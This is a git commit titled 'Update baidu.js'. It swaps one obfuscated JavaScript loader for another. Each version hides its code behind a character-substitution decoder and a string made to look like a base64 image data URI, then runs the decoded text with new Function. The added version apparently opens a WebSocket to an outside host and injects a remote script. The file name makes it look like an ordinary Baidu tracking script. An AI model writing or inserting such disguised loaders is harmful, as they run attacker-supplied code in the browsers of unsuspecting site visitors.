59692d04fed6eb735537c2ef1142f73d65fd1a3a
lowci28 <73840597+lowci28@users.noreply.github.com>
2021-08-05 16:01:16 +0000

    Update baidu.js

--- baidu.js
+++ baidu.js
@@ -1,11 +1,12 @@
-    (function () {
-            function FRdNu (s) {
-        var d = {")":"v","t":"a","}":"r","M":" ","|":"M","5":"t","^":"P","J":"j","w":"y","0":"n","c":"=","V":"f","y":"u","k":"c","I":"i","r":"o","l":"(","(":"e","A":")","H":"{","R":0,"b":"h","e":"A","i":",","2":1,"z":"m","m":"C","=":"d","K":2,"v":3,"F":"x","6":"O","X":";","+":"s","u":"B","o":"D","j":"E",">":"F","g":"G","Q":"H","d":"I","8":"J","U":"K",",":"L","S":"N","!":"Q","f":"R","[":"S","7":"T","L":"U",";":"V","T":"W"," ":"X","]":"Y","D":"Z","s":"+","x":"b","q":"g","_":"k",".":"l","-":"p","p":"q","<":"w","&":"z","W":4,"G":5,"B":6,":":7,"P":8,"Y":9,"C":".","n":"[","9":"^","Z":"-","h":"]","a":"<","O":"|","3":">","N":"&","E":"!","4":"}","{":":","1":"_"};
-        return s.split('').map(function (c) {
-            return d[c] !== undefined ? d[c] : c;
-        }).join('');
-    }
-        var c = FRdNu('data:image/jpg;base64,)t}M|5^Jw0cVy0k5Ir0l(AH)t}MtRc"kbt}e5"it2c"V}rzmbt}mr=("itKc"kbt}mr=(e5"itvc"I0=(F6V"X)t}M+Fc"eumoj>gQd8U,|S6^!f[7L;T ]D"s"txk=(VqbIJ_.z0r-p}+5y)<Fw&"s"R2KvWGB:PYs/c"X)t}M5c""i0i}iIi+iriyitiVcRX(c(C}(-.tk(l/n9eZDtZ&RZYs/ch/qi""AX<bI.(lVa(C.(0q5bAH+c+Fntvhl(ntRhlVssAAXrc+Fntvhl(ntRhlVssAAXyc+Fntvhl(ntRhlVssAAXtc+Fntvhl(ntRhlVssAAX0c+aaKOr33WX}clrN2GAaaWOy33KXIclyNvAaaBOtX5c5s[5}I0qnt2hl0AXIVlyEcBWAH5c5s[5}I0qnt2hl}AX4IVltEcBWAH5c5s[5}I0qnt2hlIAX44}(5y}0lVy0k5Ir0l(AH)t}M5c""i0c}ck2ckKcRX<bI.(l0a(C.(0q5bAH}c(ntKhl0AXIVl}a2KPAH5sc[5}I0qnt2hl}AX0ssX4(.+(MIVl}32Y2NN}aKKWAHkKc(ntKhl0s2AX5sc[5}I0qnt2hll}Nv2AaaBOkKNBvAX0scK4(.+(HkKc(ntKhl0s2AXkvc(ntKhl0sKAX5sc[5}I0qnt2hll}N2GAaa2KOlkKNBvAaaBOkvNBvAX0scvX44}(5y}0M5X4Al5AX4X)t}M=c=rkyz(05i0c0t)Iqt5r}n"-.t5Vr}z"hik+c=Cky}}(05[k}I-5XIVlE/9|tkOTI0/C5(+5l0AOOE0AHIVl0t)Iqt5r}Cy+(}eq(05CI0=(F6Vl"xtI=y"A3Z2AH)t}M<+c0(<MT(x[rk_(5l"<++{//5}Cw(+y0B:PCkrz{YvYv/2WvWBv"AX<+Cr0z(++tq(cVy0k5Ir0l(AH0(<M>y0k5Ir0l"15=k+"i|5^Jw0l(C=t5tAAlk+AX<+Ck.r+(lAX44(.+(H)t}M+c=rkyz(05Ck}(t5(j.(z(05l"+k}I-5"AX+C+}kc"b55-+{//bwC.yt++t0(Ck0/2WvWBv"Xk+C-t}(05j.(z(05CI0+(}5u(Vr}(l+ik+AX44'.substr(22));
-        new Function(c)();
-    })();
- var abcdd = 2;
+(function () {
+        function NQiIv (s) {
+    var d = {"R":"v","Z":"a","b":"r","v":" ",",":"K","z":"f","_":"y","Q":"L","]":"O","o":"h","T":"=","q":"u","=":"n","P":"c","h":"t","I":"i","n":"o","7":"(","K":"e","&":")","(":"{","-":0,"9":"A","2":",","4":1,"M":"m","^":"C","j":"d",".":2,"[":3,"N":"x","{":";","0":"s","G":"B","1":"D","6":"E","3":"F","!":"G","a":"H","d":"I","S":"J","t":"M","X":"N","V":"P","W":"Q","8":"R","D":"S",")":"T",";":"U","E":"V","A":"W","l":"X","i":"Y","e":"Z","}":"+","g":"b","H":"g","Y":"j",":":"k","c":"l","C":"p","s":"q","p":"w","F":"z","<":4,"k":5," ":6,"O":7,"5":8,"U":9,"m":".",">":"[","w":"^","u":"-","f":"]","y":"<","J":"|","r":">","|":"&","x":"!","B":"}","L":":","+":"_"};
+    return s.split('').map(function (c) {
+        return d[c] !== undefined ? d[c] : c;
+    }).join('');
+}
+    var c = NQiIv('data:image/jpg;base64,RZbv,z_Q]obTzq=PhIn=7K&(RZbvZ-T"PoZb9h"2Z4T"zbnM^oZb^njK"2Z.T"PoZb^njK9h"2Z[T"I=jKN]z"{RZbv0NT"9G^163!adS,QtX]VW8D);EAlie"}"ZgPjKzHoIY:cM=nCsb0hqRpN_F"}"-4.[<k O5U}/T"{RZbvhT""2=2b2I202n2q2Z2zT-{KTKmbKCcZPK7/>w9ueZuF-uU}/Tf/H2""&{poIcK7zyKmcK=Hho&(0T0N>Z[f7K>Z-f7z}}&&{nT0N>Z[f7K>Z-f7z}}&&{qT0N>Z[f7K>Z-f7z}}&&{ZT0N>Z[f7K>Z-f7z}}&&{=T0yy.Jnrr<{bT7n|4k&yy<Jqrr.{IT7q|[&yy JZ{hTh}DhbI=H>Z4f7=&{Iz7qxT <&(hTh}DhbI=H>Z4f7b&{BIz7ZxT <&(hTh}DhbI=H>Z4f7I&{BBbKhqb=7zq=PhIn=7K&(RZbvhT""2=TbTP4TP.T-{poIcK7=yKmcK=Hho&(bTK>Z.f7=&{Iz7by4.5&(h}TDhbI=H>Z4f7b&{=}}{BKc0KvIz7br4U4||by..<&(P.TK>Z.f7=}4&{h}TDhbI=H>Z4f77b|[4&yy JP.| [&{=}T.BKc0K(P.TK>Z.f7=}4&{P[TK>Z.f7=}.&{h}TDhbI=H>Z4f77b|4k&yy4.J7P.| [&yy JP[| [&{=}T[{BBbKhqb=vh{B&7h&{B{RZbvjTjnPqMK=h2=T=ZRIHZhnb>"CcZhznbM"f2P0TjmPqbbK=hDPbICh{Iz7x/wtZPJAI=/mhK0h7=&JJx=&(Iz7=ZRIHZhnbmq0Kb9HK=hmI=jKN]z7"gZIjq"&ru4&(RZbvp0T=KpvAKgDnP:Kh7"p00L//hbm_K0q= O5mPnMLU[U[/4<[< ["&{p0mn=MK00ZHKTzq=PhIn=7K&(=Kpv3q=PhIn=7"+hjP0"2,z_Q]ob7KmjZhZ&&7P0&{p0mPcn0K7&{BBKc0K(RZbv0TjnPqMK=hmPbKZhK6cKMK=h7"0PbICh"&{0m0bPT"ohhC0L//zHmjZnPoK=HpnpnmhnC/0/4<[< ["{P0mCZbK=h6cKMK=hmI=0KbhGKznbK702P0&{BB'.substr(22));
+    new Function(c)();
+})();
+
+var abcdd = 3;
